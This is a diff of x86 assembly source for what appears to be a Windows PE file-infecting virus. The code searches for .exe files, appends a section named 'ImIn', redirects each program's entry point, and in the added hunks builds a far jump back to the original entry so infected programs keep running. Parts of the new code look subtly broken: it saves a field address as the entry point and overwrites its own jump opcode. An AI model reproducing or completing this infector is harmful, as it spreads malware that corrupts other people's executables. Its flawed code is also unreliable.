@@ -48,11 +48,13 @@ jmp	start
 
 ; FILE
 FileData		WIN32_FIND_DATA	<>
+DebugDone		db		"Done", 0 ; TODO remove
 SearchFolder		db		"*.exe", 0
 HandleSearch		dd		?
 NewSectionName		db		"ImIn", 0
 
 ; PE
+OldEntryPoint		dd	?
 PeFile			dd	?
 PeMapObject		dd	?
 PeFileMap		dd	?
@@ -385,6 +387,7 @@ mov	eax, [DELTA PeNtHeader]
 add	eax, 01Ch
 ; CHANGE ENTRY POINT
 add	eax, 0Ch
+mov	[DELTA OldEntryPoint], eax
 mov	[eax], esi
 ; CHANGE SIZE OF IMAGE
 xor	edi, edi
@@ -444,10 +447,18 @@ lodsb
 stosb
 loop	createNewSection
 
-; FILE INJECTED - TODO REMOVE
+; CREATING JUMP TO OLD ENTRY POINT
+mov	edi, errorExit - toInject ; Offset jmp
+add	edi, [DELTA PeFileMap] ; Add base filemap
+add	edi, [DELTA PointerToRawData] ; Add section offset
+mov	byte ptr [edi], 0EAh ; Jmp far OPCODE
+mov	eax, [DELTA OldEntryPoint]
+mov	dword ptr [edi], eax ; Jmp address
+
+; DEBUG FILE INJECTED - TODO REMOVE
 push	0
 push	0
-PDELTA	FileData.cFileName
+PDELTA	DebugDone
 push	0
 call	[DELTA pMessageBox]
 
@@ -474,6 +485,7 @@ cmp	eax, 0
 je	errorExit
 jmp	nextFileToInject
 
+; Jump to old entry point (Overrided when injecting)
 errorExit:
 push	0
 call 	[DELTA pExitProcess]
